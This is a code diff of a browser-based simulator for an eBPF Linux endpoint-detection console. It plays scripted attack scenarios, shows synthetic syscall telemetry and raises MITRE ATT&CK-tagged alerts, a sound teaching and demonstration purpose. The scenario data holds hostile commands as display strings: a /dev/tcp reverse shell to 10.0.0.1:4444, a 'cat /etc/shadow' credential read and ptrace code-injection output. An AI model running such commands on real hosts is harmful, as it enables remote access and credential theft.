@@ -1,38 +1,35 @@
 /**
- * eBPF Linux EDR Sensor - Interactive SOC Simulator Engine
- * 
- * Simulates real-time kernel syscall interception, binary C-struct decoding,
- * YAML rule evaluation, and MITRE ATT&CK alert enrichment in the browser.
+ * SENTINEL-eBPF // Linux Runtime Kernel Threat Detection Workstation
+ * Industrial Tactical Console Engine
  */
 
-// State Management
-let telemetryCount = 0;
-let detectionCount = 0;
-let alertsHistory = [];
-let currentFilter = 'ALL';
+let sysCount = 0;
+let alertCount = 0;
+let incidentQueue = [];
+let activeFilter = 'ALL';
 
-// Attack Scenarios & Synthetic Telemetry Payloads
-const ATTACK_SCENARIOS = {
+const EXPLOIT_DEFINITIONS = {
   reverse_shell: {
-    title: 'Interactive Reverse Shell Execution',
+    name: 'Interactive Reverse Shell',
     ruleId: 'RULE-EDR-001',
     severity: 'CRITICAL',
+    sevBadgeClass: 'bg-crimson/20 text-crimson border-crimson/40',
+    borderClass: 'border-crimson/50 hover:border-crimson',
     mitre: {
-      tacticId: 'TA0002',
-      tacticName: 'Execution',
       techniqueId: 'T1059.004',
-      techniqueName: 'Command and Scripting Interpreter: Unix Shell',
+      techniqueName: 'Unix Shell',
+      tacticName: 'Execution (TA0002)',
       url: 'https://attack.mitre.org/techniques/T1059/004/'
     },
     commands: [
-      { text: '$ nc -l -p 4444 &', delay: 100 },
-      { text: '$ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', delay: 300, isAdversary: true },
-      { text: '[+] Outbound TCP socket established: 10.0.0.5:54321 -> 10.0.0.1:4444', delay: 500 }
+      { text: 'adversary@victim-host:~$ nc -lvnp 4444 &', delay: 80 },
+      { text: 'adversary@victim-host:~$ /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', delay: 280, isAdversary: true },
+      { text: '[+] Outbound TCP socket established: 10.0.0.5:43922 -> 10.0.0.1:4444', delay: 480 }
     ],
-    syscall: 'sys_enter_execve',
-    bpfTelemetry: {
+    syscall: 'sys_enter_execve + sys_enter_connect',
+    bpfStruct: {
       timestamp_ns: 1700000000123456789,
-      timestamp_utc: new Date().toISOString(),
+      timestamp_iso: new Date().toISOString(),
       event_type: 'EXECVE',
       pid: 1337,
       tgid: 1337,
@@ -43,67 +40,75 @@ const ATTACK_SCENARIOS = {
       filename: '/bin/bash',
       args: '-i >& /dev/tcp/10.0.0.1/4444 0>&1',
       cmdline: '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
+      outbound_ip: '10.0.0.1',
+      outbound_port: 4444,
       retval: 0
     },
-    description: 'Detects interactive shell execution with socket redirects or reverse shell command patterns.'
+    lineage: 'systemd(1) -> sshd(842) -> bash(1000) -> bash(1337)',
+    description: 'Intercepted interactive shell process redirection to network socket via /dev/tcp pseudo-device.'
   },
 
   process_injection: {
-    title: 'Process Memory Injection & PTRACE Abuse',
+    name: 'PTRACE Memory Injection',
     ruleId: 'RULE-EDR-002',
     severity: 'CRITICAL',
+    sevBadgeClass: 'bg-crimson/20 text-crimson border-crimson/40',
+    borderClass: 'border-crimson/50 hover:border-crimson',
     mitre: {
-      tacticId: 'TA0005',
-      tacticName: 'Defense Evasion',
       techniqueId: 'T1055.008',
-      techniqueName: 'Process Injection: Ptrace System Calls',
+      techniqueName: 'Ptrace System Calls',
+      tacticName: 'Defense Evasion (TA0005)',
       url: 'https://attack.mitre.org/techniques/T1055/008/'
     },
     commands: [
-      { text: '$ ./trigger_ptrace', delay: 100 },
-      { text: '[*] [Parent PID: 2048] Invoking ptrace(PTRACE_ATTACH, pid=1)...', delay: 250, isAdversary: true },
-      { text: '[+] Target attached. Invoking ptrace(PTRACE_POKETEXT, addr=0x400000, data=0x90909090)...', delay: 450, isAdversary: true }
+      { text: 'adversary@victim-host:~$ ./mem_injector --target 1 --addr 0x400000', delay: 80 },
+      { text: '[*] [PID: 2048] Invoking ptrace(PTRACE_ATTACH, target_pid=1, ...)', delay: 280, isAdversary: true },
+      { text: '[+] Target attached. Invoking ptrace(PTRACE_POKETEXT, addr=0x00400000, data=0x90909090)', delay: 480, isAdversary: true },
+      { text: '[+] Arbitrary bytecode written to foreign process memory.', delay: 650 }
     ],
     syscall: 'sys_enter_ptrace',
-    bpfTelemetry: {
+    bpfStruct: {
       timestamp_ns: 1700000001000000000,
-      timestamp_utc: new Date().toISOString(),
+      timestamp_iso: new Date().toISOString(),
       event_type: 'PTRACE',
       pid: 2048,
       tgid: 2048,
       ppid: 1000,
       uid: 1000,
       gid: 1000,
-      comm: 'injector',
+      comm: 'mem_injector',
       ptrace_request: 'PTRACE_POKETEXT',
       ptrace_request_code: 4,
       target_pid: 1,
       addr: '0x0000000000400000',
       data: '0x0000000090909090'
     },
-    description: 'Detects unauthorized ptrace system calls used for code injection or process tampering.'
+    lineage: 'systemd(1) -> bash(1000) -> mem_injector(2048)',
+    description: 'Intercepted unauthorized PTRACE_POKETEXT call attempting code injection into target process.'
   },
 
   privilege_escalation: {
-    title: 'Unexpected Root Privilege Escalation',
+    name: 'Root Privilege Escalation',
     ruleId: 'RULE-EDR-003',
     severity: 'HIGH',
+    sevBadgeClass: 'bg-amber-500/20 text-amber-400 border-amber-500/40',
+    borderClass: 'border-amber-500/50 hover:border-amber-500',
     mitre: {
-      tacticId: 'TA0004',
-      tacticName: 'Privilege Escalation',
       techniqueId: 'T1068',
-      techniqueName: 'Exploitation for Privilege Escalation',
+      techniqueName: 'Exploitation for PrivEsc',
+      tacticName: 'Privilege Escalation (TA0004)',
       url: 'https://attack.mitre.org/techniques/T1068/'
     },
     commands: [
-      { text: '$ ./dirty_pipe_exploit', delay: 100 },
-      { text: '[*] Overwriting page cache credentials...', delay: 300, isAdversary: true },
-      { text: '[+] Spawning root shell with UID 0: # /bin/sh', delay: 500, isAdversary: true }
+      { text: 'adversary@victim-host:~$ ./cve_privesc_exploit', delay: 80 },
+      { text: '[*] Overwriting kernel credentials table for current task...', delay: 280, isAdversary: true },
+      { text: '[+] UID transition verified: 1000 -> 0 (root)', delay: 450, isAdversary: true },
+      { text: 'adversary@victim-host:~# /bin/sh', delay: 600, isAdversary: true }
     ],
     syscall: 'sys_enter_execve',
-    bpfTelemetry: {
+    bpfStruct: {
       timestamp_ns: 1700000002000000000,
-      timestamp_utc: new Date().toISOString(),
+      timestamp_iso: new Date().toISOString(),
       event_type: 'EXECVE',
       pid: 31337,
       tgid: 31337,
@@ -116,29 +121,31 @@ const ATTACK_SCENARIOS = {
       cmdline: '/bin/sh',
       retval: 0
     },
-    description: 'Detects execution of root shell or privileged commands spawned under suspicious parent context.'
+    lineage: 'systemd(1) -> unprivileged_parent(1005) -> sh(31337)[UID=0]',
+    description: 'Detected unexpected shell execution with root privileges (UID 0) spawned by non-init user process.'
   },
 
   sensitive_file: {
-    title: 'Sensitive Credential File Access',
+    name: 'Sensitive Credential Read',
     ruleId: 'RULE-EDR-004',
     severity: 'HIGH',
+    sevBadgeClass: 'bg-amber-500/20 text-amber-400 border-amber-500/40',
+    borderClass: 'border-amber-500/50 hover:border-amber-500',
     mitre: {
-      tacticId: 'TA0006',
-      tacticName: 'Credential Access',
       techniqueId: 'T1003.008',
-      techniqueName: 'OS Credential Dumping: /etc/passwd and /etc/shadow',
+      techniqueName: '/etc/passwd and /etc/shadow',
+      tacticName: 'Credential Access (TA0006)',
       url: 'https://attack.mitre.org/techniques/T1003/008/'
     },
     commands: [
-      { text: '$ cat /etc/shadow', delay: 150, isAdversary: true },
-      { text: 'root:$6$rounds=4096$vF8u...:19200:0:99999:7:::', delay: 350 },
-      { text: 'daemon:*:19200:0:99999:7:::', delay: 450 }
+      { text: 'adversary@victim-host:~$ cat /etc/shadow', delay: 80, isAdversary: true },
+      { text: 'root:$6$rounds=4096$vF8u...:19200:0:99999:7:::', delay: 280 },
+      { text: 'daemon:*:19200:0:99999:7:::', delay: 400 }
     ],
     syscall: 'sys_enter_openat',
-    bpfTelemetry: {
+    bpfStruct: {
       timestamp_ns: 1700000003000000000,
-      timestamp_utc: new Date().toISOString(),
+      timestamp_iso: new Date().toISOString(),
       event_type: 'OPENAT',
       pid: 4096,
       tgid: 4096,
@@ -153,29 +160,61 @@ const ATTACK_SCENARIOS = {
       dfd: -100,
       retval: 0
     },
-    description: 'Detects unauthorized read/write access to sensitive credential stores or SSH keys.'
+    lineage: 'systemd(1) -> bash(1000) -> cat(4096)',
+    description: 'Intercepted unauthorized openat file descriptor read targeting /etc/shadow credential database.'
+  },
+
+  benign: {
+    name: 'Benign Control Activity',
+    ruleId: null,
+    severity: 'BENIGN',
+    commands: [
+      { text: 'adversary@victim-host:~$ whoami && uname -a && ls -la /tmp', delay: 80 },
+      { text: 'uid=1000(user) gid=1000(user)', delay: 200 },
+      { text: 'Linux linux-node-01 6.8.0-generic #28-Ubuntu SMP x86_64', delay: 350 },
+      { text: 'total 0\ndrwxrwxrwt  2 root root  40 Sep  8 18:00 .', delay: 500 }
+    ],
+    syscall: 'sys_enter_execve',
+    bpfStruct: {
+      timestamp_ns: 1700000004000000000,
+      timestamp_iso: new Date().toISOString(),
+      event_type: 'EXECVE',
+      pid: 5120,
+      tgid: 5120,
+      ppid: 1000,
+      uid: 1000,
+      gid: 1000,
+      comm: 'uname',
+      filename: '/bin/uname',
+      args: '-a',
+      cmdline: '/bin/uname -a',
+      retval: 0
+    },
+    lineage: 'systemd(1) -> bash(1000) -> uname(5120)',
+    description: 'Normal user activity. Verified against 4 detection rules: 0 matches (no false positives).'
   }
 };
 
 /**
- * Trigger an attack simulation by scenario key
+ * Dispatch an exploit execution
  */
-function triggerAttack(scenarioKey) {
-  const scenario = ATTACK_SCENARIOS[scenarioKey];
-  if (!scenario) return;
+function triggerExploit(key) {
+  const item = EXPLOIT_DEFINITIONS[key];
+  if (!item) return;
 
-  const term = document.getElementById('terminal-content');
-  const badge = document.getElementById('telemetry-badge');
-  const rawJson = document.getElementById('raw-bpf-json');
+  const term = document.getElementById('host-terminal');
+  const badge = document.getElementById('scope-syscall-badge');
+  const rawJson = document.getElementById('scope-raw-json');
+  const ticker = document.getElementById('bottom-ticker');
 
-  // 1. Play Terminal Execution Commands
-  scenario.commands.forEach(cmd => {
+  // 1. Terminal Typing
+  item.commands.forEach(cmd => {
     setTimeout(() => {
       const line = document.createElement('div');
       if (cmd.isAdversary) {
-        line.className = 'text-rose-400 font-semibold';
+        line.className = 'text-rose-400 font-bold';
       } else {
-        line.className = 'text-slate-300';
+        line.className = 'text-amber-200/90';
       }
       line.textContent = cmd.text;
       term.appendChild(line);
@@ -183,134 +222,134 @@ function triggerAttack(scenarioKey) {
     }, cmd.delay);
   });
 
-  // 2. Animate Kernel Tracepoint Interception
+  // 2. eBPF Kernel Interception Animation
   setTimeout(() => {
-    badge.textContent = `INTERCEPTED: ${scenario.syscall}`;
-    badge.className = 'text-[10px] font-mono px-2 py-0.5 rounded bg-rose-500/20 text-rose-400 border border-rose-500/40 font-bold';
+    sysCount += 1;
+    document.getElementById('metric-sys-count').textContent = sysCount;
 
-    // Update telemetry JSON
-    scenario.bpfTelemetry.timestamp_utc = new Date().toISOString();
-    rawJson.textContent = JSON.stringify(scenario.bpfTelemetry, null, 2);
+    badge.textContent = `INTERCEPTED: ${item.syscall}`;
+    badge.className = 'text-[10px] font-mono px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/50 font-bold';
 
-    // Increment telemetry count
-    telemetryCount += 1;
-    document.getElementById('metric-telemetry-count').textContent = telemetryCount;
+    item.bpfStruct.timestamp_iso = new Date().toISOString();
+    rawJson.textContent = JSON.stringify(item.bpfStruct, null, 2);
 
-    // Reset badge state after a short delay
+    ticker.textContent = `[${new Date().toLocaleTimeString()}] ${item.syscall} | comm='${item.bpfStruct.comm}' pid=${item.bpfStruct.pid} uid=${item.bpfStruct.uid}`;
+
+    // If malicious, register incident in Triage Queue
+    if (item.ruleId) {
+      registerIncident(item);
+    } else {
+      setTimeout(() => {
+        ticker.textContent = `[BENIGN BASELINE] Evaluated 4 rules -> 0 alerts generated (Pass)`;
+      }, 500);
+    }
+
     setTimeout(() => {
       badge.textContent = 'PROBE LISTENING';
-      badge.className = 'text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-500/10 text-cyan-400 border border-cyan-500/20';
-    }, 1200);
+      badge.className = 'text-[10px] font-mono px-2 py-0.5 rounded bg-tactical-800 text-slate-400 border border-tactical-border';
+    }, 1400);
 
-    // 3. Generate EDR Alert
-    createAlert(scenario);
-
-  }, 650);
+  }, 500);
 }
 
 /**
- * Creates and renders a new EDR detection alert card
+ * Register a detected security incident
  */
-function createAlert(scenario) {
-  detectionCount += 1;
-  document.getElementById('metric-detection-count').textContent = detectionCount;
-  document.getElementById('alert-badge-count').textContent = detectionCount;
+function registerIncident(item) {
+  alertCount += 1;
+  document.getElementById('metric-alert-count').textContent = alertCount;
+  document.getElementById('triage-badge').textContent = alertCount;
 
-  // Hide empty state if present
-  const emptyState = document.getElementById('empty-alert-state');
-  if (emptyState) {
-    emptyState.style.display = 'none';
-  }
+  const empty = document.getElementById('triage-empty');
+  if (empty) empty.style.display = 'none';
 
-  const alertObj = {
-    id: `alert-${Date.now()}-${Math.random().toString(36).substr(2, 6)}`,
-    ruleId: scenario.ruleId,
-    title: scenario.title,
-    severity: scenario.severity,
-    mitre: scenario.mitre,
-    description: scenario.description,
-    event: scenario.bpfTelemetry,
+  const incident = {
+    id: `INC-${Date.now().toString().slice(-4)}`,
+    title: item.name,
+    ruleId: item.ruleId,
+    severity: item.severity,
+    sevBadgeClass: item.sevBadgeClass,
+    borderClass: item.borderClass,
+    mitre: item.mitre,
+    description: item.description,
+    lineage: item.lineage,
+    event: item.bpfStruct,
     timestamp: new Date().toLocaleTimeString()
   };
 
-  alertsHistory.unshift(alertObj);
-  renderAlerts();
+  incidentQueue.unshift(incident);
+  renderIncidentQueue();
 }
 
 /**
- * Render all alert cards based on active filter
+ * Render incidents based on active filter
  */
-function renderAlerts() {
-  const container = document.getElementById('alerts-container');
-  const filtered = alertsHistory.filter(a => {
-    if (currentFilter === 'ALL') return true;
-    return a.severity === currentFilter;
+function renderIncidentQueue() {
+  const container = document.getElementById('incident-feed');
+  const filtered = incidentQueue.filter(inc => {
+    if (activeFilter === 'ALL') return true;
+    return inc.severity === activeFilter;
   });
 
-  // Clear previous cards except empty state
-  const cards = container.querySelectorAll('.alert-card');
+  const cards = container.querySelectorAll('.tactical-card');
   cards.forEach(c => c.remove());
 
+  const empty = document.getElementById('triage-empty');
   if (filtered.length === 0) {
-    const emptyState = document.getElementById('empty-alert-state');
-    if (emptyState) emptyState.style.display = 'flex';
+    if (empty) empty.style.display = 'flex';
     return;
   }
+  if (empty) empty.style.display = 'none';
 
-  const emptyState = document.getElementById('empty-alert-state');
-  if (emptyState) emptyState.style.display = 'none';
-
-  filtered.forEach((a, idx) => {
-    const isCritical = a.severity === 'CRITICAL';
-    const borderCol = isCritical ? 'border-rose-500/40 hover:border-rose-500' : 'border-amber-500/40 hover:border-amber-500';
-    const sevBadgeCol = isCritical ? 'bg-rose-500/15 text-rose-400 border-rose-500/30' : 'bg-amber-500/15 text-amber-400 border-amber-500/30';
-    const isNewClass = idx === 0 ? 'alert-new' : '';
-
+  filtered.forEach((inc, idx) => {
+    const isNew = idx === 0 ? 'tactical-new-incident' : '';
     const card = document.createElement('div');
-    card.className = `alert-card p-4 rounded-xl bg-cyber-850 border ${borderCol} transition-all duration-200 shadow-md ${isNewClass}`;
+    card.className = `tactical-card p-3.5 rounded-lg bg-tactical-850 border ${inc.borderClass} ${isNew} transition-all duration-200 shadow-sm space-y-2.5`;
 
-    let detailContent = '';
-    if (a.event.event_type === 'EXECVE') {
-      detailContent = `<div class="text-slate-300 font-mono text-xs mt-1 truncate"><span class="text-slate-500">cmd:</span> ${escapeHtml(a.event.cmdline)}</div>`;
-    } else if (a.event.event_type === 'PTRACE') {
-      detailContent = `<div class="text-slate-300 font-mono text-xs mt-1"><span class="text-slate-500">req:</span> ${a.event.ptrace_request} &bull; <span class="text-slate-500">target_pid:</span> ${a.event.target_pid}</div>`;
-    } else if (a.event.event_type === 'OPENAT') {
-      detailContent = `<div class="text-slate-300 font-mono text-xs mt-1 truncate"><span class="text-slate-500">file:</span> ${a.event.file_path} [${a.event.flags_desc}]</div>`;
+    let payloadDetail = '';
+    if (inc.event.event_type === 'EXECVE') {
+      payloadDetail = `<div class="truncate"><span class="text-tactical-muted">cmdline:</span> <span class="text-slate-200">${escapeHtml(inc.event.cmdline)}</span></div>`;
+    } else if (inc.event.event_type === 'PTRACE') {
+      payloadDetail = `<div><span class="text-tactical-muted">req:</span> <span class="text-crimson font-bold">${inc.event.ptrace_request}</span> &bull; <span class="text-tactical-muted">target:</span> PID ${inc.event.target_pid}</div>`;
+    } else if (inc.event.event_type === 'OPENAT') {
+      payloadDetail = `<div class="truncate"><span class="text-tactical-muted">file:</span> <span class="text-amber-300 font-bold">${inc.event.file_path}</span></div>`;
     }
 
     card.innerHTML = `
       <div class="flex items-center justify-between">
         <div class="flex items-center space-x-2">
-          <span class="text-xs font-mono font-bold px-2 py-0.5 rounded border ${sevBadgeCol}">${a.severity}</span>
-          <span class="text-xs font-mono text-slate-400 font-semibold">${a.ruleId}</span>
+          <span class="text-[10px] font-mono font-bold px-1.5 py-0.5 rounded border ${inc.sevBadgeClass}">${inc.severity}</span>
+          <span class="text-xs font-mono font-bold text-slate-300">${inc.ruleId}</span>
         </div>
-        <span class="text-xs font-mono text-slate-500">${a.timestamp}</span>
+        <span class="text-[10px] font-mono text-tactical-muted">${inc.timestamp}</span>
       </div>
 
-      <h4 class="font-bold text-white text-sm mt-2">${escapeHtml(a.title)}</h4>
-      <p class="text-xs text-slate-400 mt-0.5">${escapeHtml(a.description)}</p>
-
-      <!-- Telemetry snippet -->
-      <div class="mt-2.5 p-2 rounded-lg bg-cyber-950/80 border border-cyber-border/70">
-        <div class="flex items-center justify-between text-[11px] font-mono text-slate-400">
-          <span>comm: <strong class="text-cyan-400">${a.event.comm}</strong> (pid: ${a.event.pid})</span>
-          <span>uid: <strong class="${a.event.uid === 0 ? 'text-rose-400' : 'text-slate-300'}">${a.event.uid}</strong></span>
-          <span>ppid: ${a.event.ppid}</span>
-        </div>
-        ${detailContent}
+      <div>
+        <h4 class="font-display font-bold text-xs text-white uppercase tracking-tight">${escapeHtml(inc.title)}</h4>
+        <p class="text-[11px] text-tactical-muted mt-0.5 leading-snug">${escapeHtml(inc.description)}</p>
       </div>
 
-      <!-- MITRE ATT&CK Footer -->
-      <div class="mt-3 pt-2.5 border-t border-cyber-border/60 flex items-center justify-between text-xs">
-        <div class="flex items-center space-x-1.5">
-          <span class="w-2 h-2 rounded-full bg-purple-400"></span>
-          <span class="text-slate-400 font-mono">${a.mitre.techniqueId}</span>
-          <span class="text-slate-500">&bull;</span>
-          <span class="text-slate-300">${a.mitre.techniqueName}</span>
+      <!-- Process Lineage Box -->
+      <div class="p-2 rounded bg-tactical-950 border border-tactical-border/70 font-mono text-[10px] space-y-1">
+        <div class="flex items-center justify-between text-tactical-muted">
+          <span>comm: <strong class="text-amber-400">${inc.event.comm}</strong> (pid: ${inc.event.pid})</span>
+          <span>uid: <strong class="${inc.event.uid === 0 ? 'text-crimson' : 'text-slate-300'}">${inc.event.uid}</strong></span>
         </div>
-        <a href="${a.mitre.url}" target="_blank" rel="noopener" class="text-cyan-400 hover:text-cyan-300 flex items-center space-x-1 text-[11px]">
-          <span>MITRE Matrix</span>
-          <i data-lucide="external-link" class="w-3 h-3"></i>
+        ${payloadDetail}
+        <div class="text-tactical-muted truncate text-[9px] pt-1 border-t border-tactical-border/50">
+          LINEAGE: <span class="text-slate-400">${inc.lineage}</span>
+        </div>
+      </div>
+
+      <!-- MITRE ATT&CK Footer Tag -->
+      <div class="pt-1.5 border-t border-tactical-border/60 flex items-center justify-between text-[10px] font-mono">
+        <div class="flex items-center space-x-1.5 truncate">
+          <span class="text-tactical-muted">${inc.mitre.techniqueId}</span>
+          <span class="text-tactical-muted">&bull;</span>
+          <span class="text-slate-300 truncate">${inc.mitre.techniqueName}</span>
+        </div>
+        <a href="${inc.mitre.url}" target="_blank" rel="noopener" class="text-amber-400 hover:text-amber-300 shrink-0 ml-2">
+          MITRE &rarr;
         </a>
       </div>
     `;
@@ -318,51 +357,49 @@ function renderAlerts() {
     container.appendChild(card);
   });
 
-  // Reinitialize Lucide icons on newly created elements
   if (window.lucide) {
     lucide.createIcons();
   }
 }
 
 /**
- * Filter alerts by severity
+ * Filter triage feed
  */
-function filterAlerts(sev) {
-  currentFilter = sev;
-  document.querySelectorAll('.alert-filter-btn').forEach(btn => {
-    if (btn.textContent.toUpperCase() === sev) {
-      btn.className = 'alert-filter-btn px-2.5 py-1 rounded-md bg-cyber-700 text-white font-medium';
+function filterQueue(sev) {
+  activeFilter = sev;
+  document.querySelectorAll('.triage-filter-btn').forEach(btn => {
+    if (btn.textContent === sev) {
+      btn.className = 'triage-filter-btn px-2 py-1 rounded bg-tactical-750 text-white font-bold';
     } else {
-      btn.className = 'alert-filter-btn px-2.5 py-1 rounded-md bg-cyber-800 text-slate-300 hover:text-white';
+      btn.className = 'triage-filter-btn px-2 py-1 rounded bg-tactical-850 text-tactical-muted hover:text-white';
     }
   });
-  renderAlerts();
+  renderIncidentQueue();
 }
 
 /**
- * Clear alert history
+ * Clear queue
  */
-document.getElementById('btn-clear-alerts').addEventListener('click', () => {
-  alertsHistory = [];
-  detectionCount = 0;
-  document.getElementById('metric-detection-count').textContent = 0;
-  document.getElementById('alert-badge-count').textContent = 0;
+function clearIncidentLog() {
+  incidentQueue = [];
+  alertCount = 0;
+  document.getElementById('metric-alert-count').textContent = 0;
+  document.getElementById('triage-badge').textContent = 0;
   
-  const term = document.getElementById('terminal-content');
-  term.innerHTML = '<div class="text-slate-500"># History cleared. Terminal ready for next attack simulation...</div>';
+  const term = document.getElementById('host-terminal');
+  term.innerHTML = '<div class="text-tactical-muted">/* Incident log cleared. Workstation listening on eBPF probes... */</div>';
   
-  const rawJson = document.getElementById('raw-bpf-json');
-  rawJson.textContent = '{\n  "status": "eBPF tracepoints active",\n  "waiting_for_syscall": true\n}';
+  const rawJson = document.getElementById('scope-raw-json');
+  rawJson.textContent = '{\n  "status": "AWAITING_EVENTS",\n  "probes": 4\n}';
   
-  renderAlerts();
-});
+  renderIncidentQueue();
+}
 
 function escapeHtml(str) {
   if (!str) return '';
   return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
 }
 
-// Initial icon bootstrap
 document.addEventListener('DOMContentLoaded', () => {
   if (window.lucide) {
     lucide.createIcons();
